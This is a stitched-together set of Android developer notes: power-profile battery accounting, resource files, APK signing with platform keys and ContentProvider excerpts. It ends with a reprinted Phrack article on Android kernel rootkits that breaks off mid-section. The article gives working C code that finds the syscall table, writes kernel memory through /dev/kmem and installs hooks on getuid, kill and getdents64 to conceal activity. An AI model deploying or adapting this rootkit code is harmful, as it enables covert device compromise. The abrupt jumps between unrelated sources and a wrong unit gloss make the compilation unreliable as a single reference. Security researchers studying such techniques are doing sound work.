手机上各种设备的单位时间耗电量保存在:power_profile.xml中， 这个文件由手机制造商维护。
如果你有android源码，可以执行下面的命令找到这个文件:
```sh
$ find . | grep power_profile  
./device/htc/dream/overlay/frameworks/base/core/res/res/xml/power_profile.xml
./device/htc/passion-common/overlay/frameworks/base/core/res/res/xml/power_profile.xml
./out/target/common/obj/JAVA_LIBRARIES/android_stubs_current_intermediates/classes/res/xml/power_profile.xml
./frameworks/base/core/res/res/xml/power_profile.xml
```
下面我们来看看power_profile.xml的内容:
```xml
<device name="Android">
  <item name="none">0</item>
  <item name="screen.on">100</item>
  <item name="bluetooth.active">142</item> <!-- In call -->
  <item name="bluetooth.on">0.3</item>
  <!-- CPU wakelock held for 830ms on bluetooth headset at command. 43mA * 830 -->
  <item name="bluetooth.at">35690</item>
  <item name="screen.full">160</item>
  <item name="wifi.on">4</item>
  <item name="wifi.active">120</item>
  <item name="wifi.scan">220</item>
  <item name="dsp.audio">88</item>
  <item name="dsp.video">88</item>
  <item name="radio.active">300</item>
  <item name="gps.on">170</item>
  <item name="radio.scanning">70</item>
  <array name="radio.on"> <!-- Strength 0 to BINS-1 -->
      <value>3</value>
      <value>3</value>
  </array>
  <array name="cpu.speeds">
    <value>245000</value>
    <value>384000</value>
    <value>460800</value>
    <value>499200</value>
    <value>576000</value>
    <value>614400</value>
    <value>652800</value>
    <value>691200</value>
    <value>768000</value>
    <value>806400</value>
    <value>844800</value>
    <value>998400</value>
  </array>
  <!-- Power consumption in suspend -->
  <item name="cpu.idle">2.8</item>
  <!-- Power consumption at different speeds -->
  <array name="cpu.active">
      <value>66.6</value>
      <value>84</value>
      <value>90.8</value>
      <value>96</value>
      <value>105</value>
      <value>111.5</value>
      <value>117.3</value>
      <value>123.6</value>
      <value>134.5</value>
      <value>141.8</value>
      <value>148.5</value>
      <value>168.4</value>
  </array>
</device>
```
```div class=note
# 注意:
<value>中的数值，单位是milliAmps(毫安每秒)
```
Android已经为你提供了工具类读取这个文件:
```java
import com.android.internal.os.PowerProfile;
/**
 * Power profile 
 */
private static PowerProfile sPowerProfile = null;
/**
 * Get power profile
 * @param context
 * @return
 */
public static PowerProfile getPowerProfile(Context context) {
    if(sPowerProfile == null) {
        sPowerProfile = new PowerProfile(context);
    }
    return sPowerProfile;
}
```
# 1.3 使用PowerUtils计算设备耗电
有了以上两个信息，你需要做的就是乘法，单位换算，然后就能得到电池消耗信息， 我们已将上述两个步骤封装在PowerUtils中，使你不必关心诸多细节。
```java
long uSecTime = SystemClock.elapsedRealtime() * 1000;   
BatteryStatsImpl  mStatus  = PowerUtils.getBatteryStatus();
long   mNow                = mStatus.computeBatteryRealtime(uSecTime, mStatsType);
double mPowerScreen        = PowerUtils.getScreenUsage(context, mNow, mStatus, mStatsType);
double mPowerWifi          = PowerUtils.getWifiUsage(context, mNow, mStatus, mStatsType);
double mPowerApps          = PowerUtils.getAppsUsage(context, mNow, mStatus, mStatsType);
double mPowerPhone         = PowerUtils.getPhoneUsage(context, mNow, mStatus, mStatsType);
double mPowerIdle          = PowerUtils.getIdleUsage(context, mNow, mStatus, mStatsType);
double mPowerBt            = PowerUtils.getBluetoothUsage(context, mNow, mStatus, mStatsType);
double mPowerRadio         = PowerUtils.getRadioUsage(context, mNow, mStatus, mStatsType);
```
# 1.3.1 计算Application的耗电情况
计算设备耗电还比较好理解，但是Application的耗电情况是怎样计算出来的? 显然Application可不是设备。
Application是设备的使用者，理论上我们只要能够得到某个Application对各种设备 的使用时间，通过PowerProfile的辅助，就可以大致计算出Application所消耗的电量了。
现在的问题变成，Application主要会使用哪些设备，参考Android自带电量信息统计，结论是:
 * CPU
 * 网络设备传输数据量(只统计TCP)
 * Sensor
Application作为系统资源的使用者，通过对其消耗的系统资源大致可以估计出其耗电量。
# 参考
各种设备对电量的消耗需由手机制造商在power_profile.xml中提供定义。
```
#!sh
$ find . -name power_profile.xml
./device/htc/sapphire/overlay/frameworks/base/core/res/res/xml/power_profile.xml
./device/htc/dream/overlay/frameworks/base/core/res/res/xml/power_profile.xml
./device/htc/passion-common/overlay/frameworks/base/core/res/res/xml/power_profile.xml
./out/target/common/obj/JAVA_LIBRARIES/android_stubs_current_intermediates/classes/res/xml/power_profile.xml
./frameworks/base/core/res/res/xml/power_profile.xml
```
In the Android security model (see the discussion above in Section 2.5,
Safe and Secure, on page 41), files written by one application cannot be
read from or written to by any other application. Each program has its
own Linux user ID and data directory (/data/data/packagename) and
its own protected memory space. Android programs can communicate
with each other in two ways:
• Inter-Process Communication (IPC): One process declares an arbi-
trary API using the Android Interface Definition Language (AIDL)
and the IBinder interface. Parameters are marshaled safely and effi-
ciently between processes when the API is called. This advanced
technique is used for remote procedure calls to a background Ser-
vice thread.
• ContentProvider: Processes register themselves to the system as
providers of certain kinds of data. When that information is re-
quested, they are called by Android through a fixed API to query
or modify the content in whatever way they see fit. This is the
technique we’re going to use for the Events sample.
Any piece of information managed by a ContentProvider is addressed
through a URI that looks like this:
`content://authority/path/id`
 * content:// is the standard required prefix.
 * authority is the name of the provider. Using your fully qualified package name is recommended to prevent name collisions.
 * path is a virtual directory within the provider that identifies the kind of data being requested.
 * id is the primary key of a specific record being requested. To request all records of a particular type, omit this and the trailing
slash
 Android comes with several providers already built in:
 * content://browser
 * content://contacts
 * content://media
 * content://settings
<provider android:name="EventsProvider"
android:authorities="org.example.events" />
Shared Content Providers can be queried for results, existing records updated or deleted, and new
records added. Any application with the appropriate permissions can add, remove, or update data
from any other application — including from the native Android databases.
Many native databases are available as Content Providers, accessible by third-party applications,
including the phone’s contact manager, media store, and other native databases as described later
in this chapter.
By publishing your own data sources as Content Providers, you make it possible for you (and other
developers) to incorporate and extend your data in new applications.
@Override
public String getType(Uri _uri) {
switch (uriMatcher.match(_uri)) {
case ALLROWS: return "vnd.paad.cursor.dir/myprovidercontent";
case SINGLE_ROW: return "vnd.paad.cursor.item/myprovidercontent";
default: throw new IllegalArgumentException("Unsupported URI: " + _uri);
}
}
➤ Single item vnd.<companyname>.cursor.item/<contenttype>
➤ All items vnd.<companyName>.cursor.dir/<contenttype>
public static final Uri CONTENT_URI =
Uri.parse("content://com.paad.provider.earthquake/earthquakes");
# 不常用Valuas介绍 =
# plurals（复数）==
||=类型=||=位置=||=描述=||
||Plurals||/res/values/any-file ||表示一个基于总量的一个合适的字符串集合。总量是一个数值。各种语言，你写一个语句的方式取决于是否存在对对象的引用。这些资源编号在R.java中表示为R.plural.*。在XML文件中结构为/resources/plurals||
复数是一个字符串的集合。这些字符串用各种方式表示一个数字总量，例如，在篮子里有多少个鸡蛋。有如下例子：
 There is 1 egg.
 There are 2 eggs.
 There are 0 eggs.
 There are 100 eggs
注意这些句子2,0和100相同，然而1是不同的。Android允许你使用复数资源表示这种变化。以下例子表示了在一个资源文件中基于数量的两种变化。
```
#!xml
<resources>
    <plurals name="eggs_in_a_nest_text">
        <item quantity="one">There is 1 egg</item>
        <item quantity="other">There are %d eggs</item>
    </plurals>
</resources>
```
请注意这两个变化是一个多元的两个不同的字符串表示。现在，你可以使用Java代码，如下列例子所示，使用这个复数给定一个数量打印字符串。
getQuantityString()方法的第一个参数代表复数的资源的ID，第二个参数选择要使用的字符串。当值是1，我们只需要使用原样的字符串。当值不等于1，我们必须提供一个。第三个参数的值将替换%d。如果你要使用复数资源的格式化字符串，你至少需要这三个参数。
```
#!java
Resources res = your-activity.getResources();
String s1= res.getQuantityString(R.plurals.eggs_in_a_nest_text,0,0);
String s2 = res.getQuantityString(R.plurals.eggs_in_a_nest_text,1,1);
String s3 = res.getQuantityString(R.plurals.eggs_in_a_nest_text,2,2);
String s4 = res.getQuantityString(R.plurals.eggs_in_a_nest_text,10,10);
```
输出结果为：
```
 s1: There are 0 eggs.
 s2: There is 1 egg.
 s3: There are 2 eggs.
 s4: There are 100 eggs.
```
# Dimension ==
# 可用尺寸 ===
||px||in||mm||pt||dp||sp||
||像素||英寸||毫米||点||以160-dpi为基础的与屏幕像素密度无关的单位||与刻度无关的像素（作用于字体）
像素，英寸和点是所有能够和XML布局和Java代码中使用的尺寸。你可以使用这些尺寸在不改变源代码的情况下给Android界面添加样式。
下面示例展示了如何在XML文件中使用尺寸资源
```
#!xml
<resources>
    <dimen name="mysize_in_pixels">1px</dimen>
    <dimen name="mysize_in_dp">5dp</dimen>
    <dimen name="medium_size">100sp</dimen>
</resources>
```
在Java中，你需要通过Resources对象的实例访问相关的尺寸。你可以调activity
对象的getResources()方法获得Resources对象。当你获得了Resources对象后，你就可以通过尺寸ID获得尺寸数据。例如：
```java
float dimen = activity.getResources().getDimension(R.dimen.mysize_in_pixels);
```
与在Java代码中访问尺寸资源相同，使用dimen代替写入的尺寸。例如：
```
#!xml
<TextView android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:textSize="@dimen/medium_size"/>
```
这样在代码中需要写入某个控件的padding时，就可以使用dimen，避免直接写入数字，导致不同屏幕上的效果不同。
# Android Security
# 确认签名
Debug签名:
```
$ jarsigner -verify  -certs -verbose  bin/TemplateGem.apk
sm      2525 Sun Jun 02 23:44:06 CST 2013 assets/XmlPullParser
      X.509, CN=Android Debug, O=Android, C=US
      [证书的有效期为 12-10-10 下午9:48 至 42-10-3 下午9:48]
...
sm    544036 Sun Jun 02 23:44:06 CST 2013 classes.dex
      X.509, CN=Android Debug, O=Android, C=US
      [证书的有效期为 12-10-10 下午9:48 至 42-10-3 下午9:48]
        6508 Sun Jun 02 23:44:06 CST 2013 META-INF/MANIFEST.MF
        6561 Sun Jun 02 23:44:06 CST 2013 META-INF/CERT.SF
         776 Sun Jun 02 23:44:06 CST 2013 META-INF/CERT.RSA
  s = 已验证签名 
  m = 在清单中列出条目
  k = 在密钥库中至少找到了一个证书
  i = 在身份作用域内至少找到了一个证书
jar 已验证。
```
第三方系统签名:
```
$ jarsigner -verify  -certs -verbose  SettingsProvider.apk
         379 Wed Jun 22 22:25:12 CST 2011 META-INF/MANIFEST.MF
         421 Wed Jun 22 22:25:12 CST 2011 META-INF/CERT.SF
        1772 Wed Jun 22 22:25:12 CST 2011 META-INF/CERT.RSA
sm      1864 Wed Jun 22 22:25:12 CST 2011 AndroidManifest.xml
      X.509, EMAILADDRESS=android.os@samsung.com, CN=Samsung Cert, OU=DMC, O=Samsung Corporation, L=Suwon City, ST=South Korea, C=KR
      [证书的有效期为 11-6-22 下午8:25 至 38-11-7 下午8:25]
sm      6688 Wed Jun 22 22:25:12 CST 2011 res/drawable-hdpi/ic_launcher_settings.png
      X.509, EMAILADDRESS=android.os@samsung.com, CN=Samsung Cert, OU=DMC, O=Samsung Corporation, L=Suwon City, ST=South Korea, C=KR
      [证书的有效期为 11-6-22 下午8:25 至 38-11-7 下午8:25]
sm      1360 Wed Jun 22 22:25:12 CST 2011 res/xml/bookmarks.xml
      X.509, EMAILADDRESS=android.os@samsung.com, CN=Samsung Cert, OU=DMC, O=Samsung Corporation, L=Suwon City, ST=South Korea, C=KR
      [证书的有效期为 11-6-22 下午8:25 至 38-11-7 下午8:25]
sm     12900 Wed Jun 22 22:25:12 CST 2011 resources.arsc
      X.509, EMAILADDRESS=android.os@samsung.com, CN=Samsung Cert, OU=DMC, O=Samsung Corporation, L=Suwon City, ST=South Korea, C=KR
      [证书的有效期为 11-6-22 下午8:25 至 38-11-7 下午8:25]
  s = 已验证签名 
  m = 在清单中列出条目
  k = 在密钥库中至少找到了一个证书
  i = 在身份作用域内至少找到了一个证书
jar 已验证
```
# 使用系统签名
1. 在编译环境下, 修改Android.mk
```
LOCAL_CERTIFICATE := platform
```
2. 脚本签名
```sh
#!/bin/sh
ANDROID_HOME=''
PEM=${ANDROID_HOME}/build/target/product/security/platform.x509.pem
PK8=${ANDROID_HOME}/build/target/product/security/platform.pk8
if [ $# -ne 2 ]
then
    echo Usage $0 in.apk out.apk
    exit 1
fi
java -jar ${ANDROID_HOME}/out/host/linux-x86/framework/signapk.jar ${PEM} ${PK8} $1 $2
```
# 计算证书摘要信息
```java
public static String getPackageCertFingerprint(PackageManager pm, String packageName) {
		int flags = PackageManager.GET_SIGNATURES;
		PackageInfo packageInfo = null;
		try {
			packageInfo = pm.getPackageInfo(packageName, flags);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		Signature[] signatures = packageInfo.signatures;
		if (signatures == null) {
			return "-";
		}
		byte[] cert = signatures[0].toByteArray();
		InputStream input = new ByteArrayInputStream(cert);
		CertificateFactory cf = null;
		try {
			cf = CertificateFactory.getInstance("X509");
		} catch (CertificateException e) {
			e.printStackTrace();
		}
		X509Certificate c = null;
		try {
			c = (X509Certificate) cf.generateCertificate(input);
		} catch (CertificateException e) {
			e.printStackTrace();
		}
		StringBuffer hexString = new StringBuffer();
		try {
			MessageDigest md = MessageDigest.getInstance("SHA1");
			byte[] publicKey = md.digest(c.getPublicKey().getEncoded());
			for (int i = 0; i < publicKey.length; i++) {
				String appendString = Integer.toHexString(0xFF & publicKey[i]);
				if (appendString.length() == 1)
					hexString.append("0");
				hexString.append(appendString);
			}
		} catch (NoSuchAlgorithmException e1) {
			e1.printStackTrace();
		}
		return hexString.toString();
	}
```
# 获取平台证书的摘要
```java
	public static String getCertFingerprintsBySharedUid(PackageManager pm, String uid) {
		List<PackageInfo> xs = pm.getInstalledPackages(PackageManager.GET_PERMISSIONS | PackageManager.GET_SIGNATURES);
		String digest;
		for (PackageInfo x : xs) {
			if (!TextUtils.isEmpty(x.sharedUserId) && x.sharedUserId.equalsIgnoreCase(uid)) {
				if (x.signatures != null) {
					digest = getPackageCertFingerprint(pm, x.packageName);
					return digest;
				}
			}
		}
		return "";
	}
...
    String platformCertDigest = getCertFingerprintsBySharedUid(mPm, "android.uid.system");
```
```
       ==Phrack Inc.==
                Volume 0x0e, Issue 0x44, Phile #0x06 of 0x13
|=-----------------------------------------------------------------------=|
|=-----------=[ Android platform based linux kernel rootkit ]=-----------=|
|=-----------------------------------------------------------------------=|
|=-----------------=[ dong-hoon you <x82@inetcop.org> ]=-----------------=|
|=------------------------=[ April 04th 2011 ]=--------------------------=|
|=-----------------------------------------------------------------------=|
--[ Contents
  1 - Introduction
  2 - Basic techniques for hooking
    2.1 - Searching sys_call_table
    2.2 - Identifying sys_call_table size
    2.3 - Getting over the problem of structure size in kernel versions
    2.4 - Treating version magic
  3 - sys_call_table hooking through /dev/kmem access technique
  4 - modifying sys_call_table handle code in vector_swi handler routine
  5 - exception vector table modifying hooking techniques
    5.1 - exception vector table
    5.2 - Hooking techniques changing vector_swi handler
    5.3 - Hooking techniques changing branch instruction offset
  6 - Conclusion
  7 - References
  8 - Appendix: earthworm.tgz.uu
--[ 1 - Introduction
This paper covers rootkit techniques that can be used in linux kernel based
on Android platform using ARM(Advanced RISC Machine) process. All the tests
in this paper were performed in Motoroi XT720 model(2.6.29-omap1 kernel)
and Galaxy S SHW-M110S model(2.6.32.9 kernel). Note that some contents may
not apply to all smart platform machines and there are some bugs you can
modify.
We have seen various linux kernel hooking techniques of some pioneers([1]
[2][3][4][5]). Especially, I appreciate to Silvio Cesare and sd who
introduced and developed the /dev/kmem technique. Read the references for
more information.
In this paper, we are going to discuss a few hooking techniques.
	1. Simple and traditional hooking technique using kmem device.
	2. Traditional hooking technique changing sys_call_table offset in
	   vector_swi handler.
	3. Two newly developed hooking techniques changing interrupt
	   service routine handler in exception vector table.
The main concepts of the techniques mentioned in this paper are 'smart' and
'simple'. This is because this paper focuses on hooking through modifying
the least kernel memory and by the simplest way. As the past good
techniques were, hooking must be possible freely before and after system
call.
This paper consists of eight parts and I tried to supply various examples
for readers' convenience by putting abundant appendices. The example codes
are written for ARM architecture, but if you modify some parts, you can use
them in the environment of ia32 architecture and even in the environment
that doesn't support LKM.
--[ 2 - Basic techniques for hooking
sys_call_table is a table which stores the addresses of low-level system
routines. Most of classical hooking techniques interrupt the sys_call_table
for some purposes. Because of this, some protection techniques such as
hiding symbol and moving to the field of read-only have been adapted to
protect sys_call_table from attackers. These protections, however,
can be easily removed if an attacker uses kmem device access technique.
To discuss other techniques making protection useless is beyond the purpose
of this paper.
--[ 2.1 - Searching sys_call_table
If sys_call_table symbol is not exported and there is no sys_call_table
information in kallsyms file which contains kernel symbol table
information, it will be difficult to get the sys_call_table address that
varies on each version of platform kernel. So, we need to research the way
to get the address of sys_call_table without symbol table information.
You can find the similar techniques in the web[10], but apart from this,
this paper is written to meet the Android platform on the way of testing.
--[ 2.1.1 - Getting sys_call_table address in vector_swi handler
At first, I will introduce the first two ways to get sys_call_table address
The code I will introduce here is written dependently in the interrupt
implementation of ARM process.
Generally, in the case of ARM process, when interrupt or exception happens,
it branches to the exception vector table. In that exception vector table,
there are exception hander addresses that match each exception handler
routines. The kernel of present Android platform uses high vector
(0xffff0000) and at the point of 0xffff0008, offset by 0x08, there is a 4
byte instruction to branch to the software interrupt handler. When the
instruction runs, the address of the software interrupt handler stored in
the address 0xffff0420, offset by 0x420, is called. See the section 5.1 for
more information.
void get_sys_call_table(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0;
	unsigned long sys_call_table=0;
	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);
	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&
		0xfffff000)==0xe28f8000){
			offset=((*(unsigned long *)vector_swi_addr)&
			0xfff)+8;
			sys_call_table=(void *)vector_swi_addr+offset;
			break;
		}
	}
	return;
}
At first, this code gets the address of vector_swi routine(software
interrupt process exception handler) in the exception vector table of high
vector and then, gets the address of a code that handles the
sys_call_table address. The followings are some parts of vector_swi handler
code.
000000c0 <vector_swi>:
    c0: e24dd048 sub     sp, sp, #72     ; 0x48 (S_FRAME_SIZE)
    c4: e88d1fff stmia   sp, {r0 - r12}  ; Calling r0 - r12
    c8: e28d803c add     r8, sp, #60     ; 0x3c (S_PC)
    cc: e9486000 stmdb   r8, {sp, lr}^   ; Calling sp, lr
    d0: e14f8000 mrs     r8, SPSR        ; called from non-FIQ mode, so ok.
    d4: e58de03c str     lr, [sp, #60]   ; Save calling PC
    d8: e58d8040 str     r8, [sp, #64]   ; Save CPSR
    dc: e58d0044 str     r0, [sp, #68]   ; Save OLD_R0
    e0: e3a0b000 mov     fp, #0  ; 0x0   ; zero fp
    e4: e3180020 tst     r8, #32 ; 0x20  ; this is SPSR from save_user_regs
    e8: 12877609 addne   r7, r7, #9437184; put OS number in
    ec: 051e7004 ldreq   r7, [lr, #-4]
    f0: e59fc0a8 ldr     ip, [pc, #168]  ; 1a0 <__cr_alignment>
    f4: e59cc000 ldr     ip, [ip]
    f8: ee01cf10 mcr     15, 0, ip, cr1, cr0, {0} ; update control register
    fc: e321f013 msr     CPSR_c, #19     ; 0x13 enable_irq
   100: e1a096ad mov     r9, sp, lsr #13 ; get_thread_info tsk
   104: e1a09689 mov     r9, r9, lsl #13
[*]108: e28f8094 add     r8, pc, #148    ; load syscall table pointer
   10c: e599c000 ldr     ip, [r9]        ; check for syscall tracing
The asterisk part is the code of sys_call_table. This code notifies the
start of sys_call_table at the appointed offset from the present pc
address. So, we can get the offset value to figure out the position of
sys_call_table if we can find opcode pattern corresponding to "add r8, pc"
instruction.
opcode: 0xe28f8???
if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){
	offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;
	sys_call_table=(void *)vector_swi_addr+offset;
	break;
From this, we can get the address of sys_call_table handled in
vector_swi handler routine. And there is an easier way to do this.
--[ 2.1.2 - Finding sys_call_table addr through sys_close addr searching
The second way to get the address of sys_call_table is simpler than the way
introduced in 2.1.1. This way is to find the address by using the fact that
sys_close address, with open symbol, is in 0x6 offset from the starting
point of sys_call_table.
... the same vector_swi address searching routine parts omitted ...
	while(vector_swi_addr++){
		if(*(unsigned long *)vector_swi_addr==&sys_close){
			sys_call_table=(void *)vector_swi_addr-(6*4);
			break;
		}
	}
}
By using the fact that sys_call_table resides after vector_swi handler
address, we can search the sys_close which is appointed as the sixth system
call of sys_table_call.
fs/open.c:
EXPORT_SYMBOL(sys_close);
...
call.S:
/* 0 */		CALL(sys_restart_syscall)
		CALL(sys_exit)
		CALL(sys_fork_wrapper)
		CALL(sys_read)
		CALL(sys_write)
/* 5 */		CALL(sys_open)
		CALL(sys_close)
This searching way has a technical disadvantage that we must get the
sys_close kernel symbol address beforehand if it's implemented in user
mode.
--[ 2.2 - Identifying sys_call_table size
The hooking technique which will be introduced in section 4 changes the
sys_call_table handle code within vector_swi handler. It generates the copy
of the existing sys_call_table in the heap memory. Because the size of
sys_call_table varies in each platform kernel version, we need a precise
size of sys_call_table to generate a copy.
... the same vector_swi address searching routine parts omitted ...
	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&
		0xffff0000)==0xe3570000){
			i=0x10-(((*(unsigned long *)vector_swi_addr)&
			0xff00)>>8);
			size=((*(unsigned long *)vector_swi_addr)&
			0xff)<<(2*i);
			break;
		}
	}
}
This code searches code which controls the size of sys_call_table within
vector_swi routine and then gets the value, the size of sys_call_table.
The following code determines the size of sys_call_table, and it makes a
part of a function that calls system call saved in sys_call_table.
   118: e92d0030 stmdb   sp!, {r4, r5}   ; push fifth and sixth args
   11c: e31c0c01 tst     ip, #256        ; are we tracing syscalls?
   120: 1a000008 bne     148 <__sys_trace>
[*]124: e3570f5b cmp     r7, #364        ; check upper syscall limit
   128: e24fee13 sub     lr, pc, #304    ; return address
   12c: 3798f107 ldrcc   pc, [r8, r7, lsl #2] ; call sys_* routine
The asterisk part compares the size of sys_call_table. This code checks if
the r7 register value which contains system call number is bigger than
syscall limit. So, if we search opcode pattern(0xe357????) corresponding to
"cmp r7", we can get the exact size of sys_call_table. For your
information, all of the offset values can be obtained by using ARM
architecture operand counting method.
--[ 2.3 - Getting over the problem of structure size in kernel versions
Even if you are using the same version of kernels, the size of structure
varies according to the compile environments and config options. Thus, if
we use a wrong structure with a wrong size, it is not likely to work as we
expect. To prevent errors caused by the difference of structure offset and
to enable our code to work in various kernel environments, we need to build
a function which gets the offset needed from the structure.
void find_offset(void){
	unsigned char *init_task_ptr=(char *)&init_task;
	int offset=0,i;
	char *ptr=0;
	/* getting the position of comm offset
	   within task_struct structure */
	for(i=0;i<0x600;i++){
		if(init_task_ptr[i]=='s'&&init_task_ptr[i+1]=='w'&&
		init_task_ptr[i+2]=='a'&&init_task_ptr[i+3]=='p'&&
		init_task_ptr[i+4]=='p'&&init_task_ptr[i+5]=='e'&&
		init_task_ptr[i+6]=='r'){
			comm_offset=i;
			break;
		}
	}
	/* getting the position of tasks.next offset
	   within task_struct structure */
	init_task_ptr+=0x50;
	for(i=0x50;i<0x300;i+=4,init_task_ptr+=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000){
			offset-=i;
			offset+=comm_offset;
			if(strcmp((char *)offset,"init")){
				continue;
			} else {
				next_offset=i;
				/* getting the position of parent offset
				   within task_struct structure */
				for(;i<0x300;i+=4,init_task_ptr+=4){
					offset=*(long *)init_task_ptr;
					if(offset&&offset>0xc0000000){
						offset+=comm_offset;
						if(strcmp
						((char *)offset,"swapper"))
						{
							continue;
						} else {
							parent_offset=i+4;
							break;
						}
					}
				}
				break;
			}
		}
	}
	/* getting the position of cred offset
	   within task_struct structure */
	init_task_ptr=(char *)&init_task;
	init_task_ptr+=comm_offset;
	for(i=0;i<0x50;i+=4,init_task_ptr-=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000&&offset<0xd0000000&&
			offset==*(long *)(init_task_ptr-4)){
			ptr=(char *)offset;
			if(*(long *)&ptr[4]==0&&
				*(long *)&ptr[8]==0&&
				*(long *)&ptr[12]==0&&
				*(long *)&ptr[16]==0&&
				*(long *)&ptr[20]==0&&
				*(long *)&ptr[24]==0&&
				*(long *)&ptr[28]==0&&
				*(long *)&ptr[32]==0){
				cred_offset=i;
				break;
			}
		}
	}
	/* getting the position of pid offset
	   within task_struct structure */
	pid_offset=parent_offset-0xc;
	return;
}
This code gets the information of PCB(process control block) using some
features that can be used as patterns of task_struct structure.
First, we need to search init_task for the process name "swapper" to find
out address of "comm" variable within task_struct structure created before
init process. Then, we search for "next" pointer from "tasks" which is a
linked list of process structure. Finally, we use "comm" variable to figure
out whether the process has a name of "init". If it does, we get the offset
address of "next" pointer.
include/linux/sched.h:
struct task_struct {
...
	struct list_head tasks;
...
	pid_t pid;
...
	struct task_struct *real_parent; /* real parent process */
	struct task_struct *parent; /* recipient of SIGCHLD,
					wait4() reports */
...
	const struct cred *real_cred; /* objective and
					real subjective task
					* credentials (COW) */
	const struct cred *cred; /* effective (overridable)
					subjective task */
	struct mutex cred_exec_mutex; /* execve vs ptrace cred
					calculation mutex */
	char comm[TASK_COMM_LEN]; /* executable name ... */
After this, we get the parent pointer by checking some pointers. And if
this is a right parent pointer, it has the name of previous task(init_task)
process, swapper. The reason we search the address of parent pointer is to
get the offset of pid variable by using a parent offset as a base point.
To get the position of cred structure pointer related with task privilege,
we perform backward search from the point of comm variable and check if the
id of each user is 0.
--[ 2.4 - Treating version magic
Check the whitepaper[11] of Christian Papathanasiou and Nicholas J. Percoco
in Defcon 18. The paper introduces the way of treating version magic by
modifying the header of utsrelease.h when we compile LKM rootkit module.
In fact, I have used a tool which overwrites the vermagic value of compiled
kernel module binary directly before they presented.
--[ 3 - sys_call_table hooking through /dev/kmem access technique
I hope you take this section as a warming-up. If you want to know more
detailed background knowledge about /dev/kmem access technique, check the
"Run-time kernel patching" by Silvio and "Linux on-the-fly kernel patching
without LKM" by sd.
At least until now, the root privilege of access to /dev/kmem device within
linux kernel in Android platform is allowed. So, it is possible to move
through lseek() and to read through read(). Newly written /dev/kmem access
routines are as follows.
#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)
int kmem;
/* read data from kmem */
void read_kmem(unsigned char *m,unsigned off,int sz)
{
        int i;
        void *buf,*v_addr;
        if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,
	MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
                perror("read: mmap error");
                exit(0);
        }
        for(i=0;i<sz;i++){
                v_addr=buf+(off&MAP_MASK)+i;
                m[i]=*((unsigned char *)v_addr);
        }
        if(munmap(buf,MAP_SIZE*2)==-1){
                perror("read: munmap error");
                exit(0);
        }
	return;
}
/* write data to kmem */
void write_kmem(unsigned char *m,unsigned off,int sz)
{
        int i;
        void *buf,*v_addr;
        if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,
	MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
                perror("write: mmap error");
                exit(0);
        }
        for(i=0;i<sz;i++){
                v_addr=buf+(off&MAP_MASK)+i;
                *((unsigned char *)v_addr)=m[i];
        }
        if(munmap(buf,MAP_SIZE*2)==-1){
                perror("write: munmap error");
                exit(0);
        }
	return;
}
This code makes the kernel memory address we want shared with user memory
area as much as the size of two pages and then we can read and write the
kernel by reading and writing on the shared memory. Even though the
searched sys_call_table is allocated in read-only area, we can simply
modify the contents of sys_call_table through /dev/kmem access technique.
The example of hooking through sys_call_table modification is as follows.
kmem=open("/dev/kmem",O_RDWR|O_SYNC);
if(kmem<0){
	return 1;
}
...
if(c=='I'||c=='i'){ /* install */
	addr_ptr=(char *)get_kernel_symbol("hacked_getuid");
	write_kmem((char *)&addr_ptr,addr+__NR_GETUID*4,4);
	addr_ptr=(char *)get_kernel_symbol("hacked_writev");
	write_kmem((char *)&addr_ptr,addr+__NR_WRITEV*4,4);
	addr_ptr=(char *)get_kernel_symbol("hacked_kill");
	write_kmem((char *)&addr_ptr,addr+__NR_KILL*4,4);
	addr_ptr=(char *)get_kernel_symbol("hacked_getdents64");
	write_kmem((char *)&addr_ptr,addr+__NR_GETDENTS64*4,4);
} else if(c=='U'||c=='u'){ /* uninstall */
	...
}
close(kmem);
The attack code can be compiled in the mode of LKM module and general ELF32
executable file format.
--[ 4 - modifying sys_call_table handle code in vector_swi handler routine
The techniques introduced in section 3 are easily detected by rootkit
detection tools. So, some pioneers have researched the ways which modify
some parts of exception handler function processing software interrupt.
The technique introduced in this section generates a copy version of
sys_call_table in kernel heap memory without modifying the
sys_call_table directly.
static void *hacked_sys_call_table[500];
static void **sys_call_table;
int sys_call_table_size;
...
int init_module(void){
...
	get_sys_call_table(); // position and size of sys_call_table
	memcpy(hacked_sys_call_table,sys_call_table,sys_call_table_size*4);
After generating this copy version, we have to modify some parts of
sys_call_table processed within vector_swi handler routine. It is because
sys_call_table is handled as a offset, not an address. It is a feature that
separates ARM architecture from ia32 architecture.
code before compile:
ENTRY(vector_swi)
...
	get_thread_info tsk
	adr     tbl, sys_call_table ; load syscall table pointer
	~~~~~~~~~~~~~~~~~~~~~~~~~~~ -> code of sys_call_table
	ldr     ip, [tsk, #TI_FLAGS] ; @ check for syscall tracing
code after compile:
000000c0 <vector_swi>:
...
   100: e1a096ad mov     r9, sp, lsr #13 ; get_thread_info tsk
   104: e1a09689 mov     r9, r9, lsl #13
[*]108: e28f8094 add     r8, pc, #148    ; load syscall table pointer
                 ~~~~~~~~~~~~~~~~~~~~
                 +-> deal sys_call_table as relative offset
   10c: e599c000 ldr     ip, [r9]        ; check for syscall tracing
So, I contrived a hooking technique modifying "add r8, pc, #offset" code
itself like this.
before modifying: e28f80??	add     r8, pc, #??
after  modifying: e59f80??	ldr     r8, [pc, #??]
These instructions get the address of sys_call_table at the specified
offset from the present pc address and then store it in r8 register. As a
result, the address of sys_call_table is stored in r8 register. Now, we
have to make a separated space to store the address of sys_call_table copy
near the processing routine. After some consideration, I decided to
overwrite nop code of other function's epilogue near vector_swi handler.
00000174 <__sys_trace_return>:
